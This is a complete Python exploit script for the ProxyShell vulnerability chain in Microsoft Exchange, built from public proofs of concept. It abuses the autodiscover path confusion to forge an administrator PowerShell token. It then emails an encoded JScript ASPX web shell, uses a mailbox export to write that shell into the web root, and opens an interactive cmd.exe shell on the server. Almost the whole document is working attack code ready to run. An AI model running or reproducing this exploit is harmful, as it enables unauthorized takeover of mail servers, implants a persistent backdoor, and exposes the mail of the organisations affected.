#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "pypsrp>=0.9.0",
#     "requests",
# ]
# ///

import requests
import argparse
import sys
import struct
import base64
import string
import random
import time
import threading
import xml.etree.ElementTree as ET
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
import binascii
import os


# ============ encode_payload.py functions ============
def generate_payload():
    # Credits: https://github.com/ktecv2000/ProxyShell/blob/main/exploit.py#L175

    payload =  "<script language='JScript' runat='server' Page aspcompat=true>function Page_Load(){eval(Request['cmd'],'unsafe');}</script>"

    compEnc = [0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
               0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
               0x05, 0x96, 0x30, 0xf5, 0x37, 0x60, 0x82, 0x8c, 0xc9, 0x13, 0x4a, 0x6b, 0x1d, 0xf3, 0xfb, 0x8f, 0x26, 0x97,
               0xca, 0x91, 0x17, 0x01, 0xc4, 0x32, 0x2d, 0x6e, 0x31, 0x95, 0xff, 0xd9, 0x23, 0xd1, 0x00, 0x5e, 0x79, 0xdc,
               0x44, 0x3b, 0x1a, 0x28, 0xc5, 0x61, 0x57, 0x20, 0x90, 0x3d, 0x83, 0xb9, 0x43, 0xbe, 0x67, 0xd2, 0x46, 0x42,
               0x76, 0xc0, 0x6d, 0x5b, 0x7e, 0xb2, 0x0f, 0x16, 0x29, 0x3c, 0xa9, 0x03, 0x54, 0x0d, 0xda, 0x5d, 0xdf, 0xf6,
               0xb7, 0xc7, 0x62, 0xcd, 0x8d, 0x06, 0xd3, 0x69, 0x5c, 0x86, 0xd6, 0x14, 0xf7, 0xa5, 0x66, 0x75, 0xac, 0xb1,
               0xe9, 0x45, 0x21, 0x70, 0x0c, 0x87, 0x9f, 0x74, 0xa4, 0x22, 0x4c, 0x6f, 0xbf, 0x1f, 0x56, 0xaa, 0x2e, 0xb3,
               0x78, 0x33, 0x50, 0xb0, 0xa3, 0x92, 0xbc, 0xcf, 0x19, 0x1c, 0xa7, 0x63, 0xcb, 0x1e, 0x4d, 0x3e, 0x4b, 0x1b,
               0x9b, 0x4f, 0xe7, 0xf0, 0xee, 0xad, 0x3a, 0xb5, 0x59, 0x04, 0xea, 0x40, 0x55, 0x25, 0x51, 0xe5, 0x7a, 0x89,
               0x38, 0x68, 0x52, 0x7b, 0xfc, 0x27, 0xae, 0xd7, 0xbd, 0xfa, 0x07, 0xf4, 0xcc, 0x8e, 0x5f, 0xef, 0x35, 0x9c,
               0x84, 0x2b, 0x15, 0xd5, 0x77, 0x34, 0x49, 0xb6, 0x12, 0x0a, 0x7f, 0x71, 0x88, 0xfd, 0x9d, 0x18, 0x41, 0x7d,
               0x93, 0xd8, 0x58, 0x2c, 0xce, 0xfe, 0x24, 0xaf, 0xde, 0xb8, 0x36, 0xc8, 0xa1, 0x80, 0xa6, 0x99, 0x98, 0xa8,
               0x2f, 0x0e, 0x81, 0x65, 0x73, 0xe4, 0xc2, 0xa2, 0x8a, 0xd4, 0xe1, 0x11, 0xd0, 0x08, 0x8b, 0x2a, 0xf2, 0xed,
               0x9a, 0x64, 0x3f, 0xc1, 0x6c, 0xf9, 0xec]
    
    out = [None]*len(payload)
    for i in range(len(payload)):
        temp = ord(payload[i]) & 0xff
        out[i] = "%02x" % (compEnc[temp])
    out = ''.join(out)
    return base64.b64encode(binascii.unhexlify(out)).decode()


# ============ Original proxyshell.py classes ============
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


class ExchangePowershellHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        # post_data = re.sub('<wsa:To>(.*?)</wsa:To>',
        #                    '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        # post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>',
        #                    '<wsman:ResourceUśI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        powershell_endpoint = exchange_url + \
            f"/autodiscover/autodiscover.json?@test.com/powershell/?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
        # import pdb; pdb.set_trace()
        resp = requests.post(powershell_endpoint,
                             data=post_data, headers=headers, verify=False)
        content = resp.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(content)


def check_proxyshell_on_exchange(url: str):
    print("[-] Checking for Proxyshell vulnerability on Exchange Server")
    endpoint_url = url + \
        f"/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.get(endpoint_url, verify=False, allow_redirects=False)
    if resp.status_code == 302:
        print("[+] Exchange Server is vulnerable to Proxyshell")
        return True

    print("[x] Exchange Server is not vulnerable to Proxyshell")
    return False


def gen_token(email: str, sid: str):
    # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    print("[-] Generating token")
    version = 0
    ttype = 'Windows'
    compressed = 0
    auth_type = 'Kerberos'
    raw_token = b''
    gsid = 'S-1-5-32-544'

    version_data = b'V' + (1).to_bytes(1, 'little') + \
        (version).to_bytes(1, 'little')
    type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
    compress_data = b'C' + (compressed).to_bytes(1, 'little')
    auth_data = b'A' + (len(auth_type)).to_bytes(1,
                                                 'little') + auth_type.encode()
    login_data = b'L' + (len(email)).to_bytes(1, 'little') + email.encode()
    user_data = b'U' + (len(sid)).to_bytes(1, 'little') + sid.encode()
    group_data = b'G' + struct.pack('<II', 1, 7) + \
        (len(gsid)).to_bytes(1, 'little') + gsid.encode()
    ext_data = b'E' + struct.pack('>I', 0)

    raw_token += version_data
    raw_token += type_data
    raw_token += compress_data
    raw_token += auth_data
    raw_token += login_data
    raw_token += user_data
    raw_token += group_data
    raw_token += ext_data

    data = base64.b64encode(raw_token).decode()

    print(f"[+] Token generated: {data}")
    return data


def check_token_valid(url: str, token: str):
    print("[-] Checking if token is valid or not")
    powershell_endpoint = url + \
        f"/autodiscover/autodiscover.json?@test.com/powershell/?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.get(powershell_endpoint, verify=False)
    if resp.status_code == 200:
        print("[+] Token is valid")
        return
    print("[x] Token is not valid, need more debugging")
    sys.exit(1)


def get_sid(url: str, email: str):

    print("[-] Getting LegacyDN")
    body = f"""
        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{email}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>
    """

    autodiscover_url = url + f"/autodiscover/autodiscover.json?@test.com/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(autodiscover_url, headers={
        "Content-Type": "text/xml"
    }, data=body.encode("utf-8"), verify=False)

     # If status code 200 is NOT returned, the request failed
    if resp.status_code != 200:
        print("[Stage 1] Request failed - Autodiscover Error!")
        exit()

    # If the LegacyDN information is not in the response, the request failed as well
    if "<LegacyDN>" not in resp.content.decode('utf8').strip():
        print("[Stage 1] Cannot obtain required LegacyDN-information!")
        exit()

    #autodiscover_xml = ET.fromstring(resp.text)

    #legacydn = autodiscover_xml.find('{*}Response/{*}User/{*}LegacyDN').text
    legacydn = resp.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]

    print("[+] Successfully get LegacyDN")
    data = legacydn
    data += '\x00\x00\x00\x00\x00\xe4\x04'
    data += '\x00\x00\x09\x04\x00\x00\x09'
    data += '\x04\x00\x00\x00\x00\x00\x00'

    headers = {
        "X-Requesttype": 'Connect',
        "X-Clientapplication": 'Outlook/15.1.2176.9',
        "X-Requestid": 'anything',
        'Content-Type': 'application/mapi-http'
    }
    print("[-] Getting User SID")
    sid_endpoint = url + f"/autodiscover/autodiscover.json?@test.com/mapi/emsmdb?&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(sid_endpoint, data=data,
                         headers=headers, verify=False)
    sid = resp.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
    print("[+] Successfully get User SID")
    return sid

def rand_subject(n=6):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def send_email_contains_malicious_payload():
    # Trying to find the way to encode the right payload in python ... 
    encoded_payload = generate_payload()
    subject_id = rand_subject(16)
    print (f"[-] Sending email contains payload with subject id: {subject_id}")
    email_body = f"""
    <soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:SerializedSecurityContext>
      <t:UserSid>{sid}</t:UserSid>
      <t:GroupSids>
        <t:GroupIdentifier>
          <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
        </t:GroupIdentifier>
      </t:GroupSids>
    </t:SerializedSecurityContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem MessageDisposition="SaveOnly">
      <m:Items>
        <t:Message>
          <t:Subject>{subject_id}</t:Subject>
          <t:Body BodyType="HTML">hello from darkness side</t:Body>
          <t:Attachments>
            <t:FileAttachment>
              <t:Name>FileAttachment.txt</t:Name>
              <t:IsInline>false</t:IsInline>
              <t:IsContactPhoto>false</t:IsContactPhoto>
              <t:Content>{encoded_payload}</t:Content>
            </t:FileAttachment>
          </t:Attachments>
          <t:ToRecipients>
            <t:Mailbox>
              <t:EmailAddress>{email}</t:EmailAddress>
            </t:Mailbox>
          </t:ToRecipients>
        </t:Message>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>
    """
    headers = {
        "Content-Type": "text/xml",
        # 'Cookie': f'Email=autodiscover/autodiscover.json?a=a@gmail.com'
    }
    ews_endpoint = exchange_url + f"/autodiscover/autodiscover.json?@test.com/EWS/exchange.asmx?X-Rps-CAT={token}&Email=autodiscover/autodiscover.json%3F@test.com"
    resp = requests.post(ews_endpoint, data=email_body, headers=headers, verify=False)
    if resp.status_code == 200:
        print (f"[+] Sent email successfully with subject id: {subject_id}")
    return subject_id

# ------------------------------------------------------------------------------


def start_server(url: str, token: str, port: int):
    server = ThreadedHTTPServer(('', port), ExchangePowershellHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command: str, port):
    # Credits: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
    if command.lower() in ['exit', 'quit']:
        exit()

    wsman = WSMan("127.0.0.1", username='', password='', ssl=False,
                  port=port, auth='basic', encryption='never')
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        if command.lower().strip() == "get_shell":
            subject_id = send_email_contains_malicious_payload()
            assign_permission_command = f"New-ManagementRoleAssignment -Role \"Mailbox Import Export\" -User {email}"
            print ("[-] Executing command: ", assign_permission_command)
            ps = PowerShell(pool)
            ps.add_script(assign_permission_command)
            output_1 = ps.invoke()
            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output_1]))
            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

            cleanup_export_command = "Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false"
            print ("[-] Executing command: ", cleanup_export_command)
            ps = PowerShell(pool)
            ps.add_script(cleanup_export_command)
            output_2 = ps.invoke()
            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output_2]))
            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

            file_path = f"\\\\localhost\\c$\\inetpub\\wwwroot\\aspnet_client\\{subject_id}.aspx"
            write_fie_command = f"""New-MailboxExportRequest -Mailbox {email} -IncludeFolders "#Drafts#" -FilePath "{file_path}" -ContentFilter "Subject -eq '{subject_id}'" """
            print ("[-] Executing command: ", write_fie_command)
            ps = PowerShell(pool)
            ps.add_script(write_fie_command)
            output_3 = ps.invoke()
            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output_3]))
            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

            shell_url = f'{exchange_url}/aspnet_client/{subject_id}.aspx'
            print(f'Shell URL: {shell_url}')
            # Credits: https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell_rce.py#L238
            for i in range(10):
                print(f'Testing shell {i}')
                r = requests.get(shell_url, verify=False)
                if r.status_code == 200:
                    delimit = rand_subject()
                    
                    while True:
                        cmd = input('Shell> ')
                        if cmd.lower() in ['exit', 'quit']:
                            return

                        exec_code = f'Response.Write("{delimit}" + new ActiveXObject("WScript.Shell").Exec("cmd.exe /c {cmd}").StdOut.ReadAll() + "{delimit}");'
                        r = requests.get(
                            shell_url,
                            params={
                                'cmd':exec_code
                            },
                            verify=False
                        )
                        output = r.content.split(delimit.encode())[1]
                        print(output.decode())

                time.sleep(5)
                i += 1

            print('Shell drop failed :(')
            return

        else:
            ps = PowerShell(pool)
            ps.add_script(command)
            output = ps.invoke()
            print("OUTPUT:\n%s" % "\n".join([str(s) for s in output]))
            print("ERROR:\n%s" % "\n".join([str(s) for s in ps.streams.error]))

# ------------------------------------------------------------------------------


def main():
    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-u', help='Exchange URL', required=True)
    parser.add_argument('-e', help='Email address', required=True)
    parser.add_argument('-p', help='Local wsman port', default=8000, type=int)
    args = parser.parse_args()
    global exchange_url
    global token
    global sid
    global email
    exchange_url = args.u
    email = args.e
    local_port = args.p
    # Ignore TLS Verify error
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning)
    # Stage 1
    is_vulnerable = check_proxyshell_on_exchange(exchange_url)
    if not is_vulnerable:
        sys.exit(1)
    # Stage 2
    sid = get_sid(exchange_url, email)
    token = gen_token(email, sid)
    check_token_valid(exchange_url, token)
    # Stage 3
    # Proxy server
    start_server(port=local_port, url=exchange_url, token=token)

    while True:
        shell(input('PS> '), local_port)


if __name__ == '__main__':
    main()
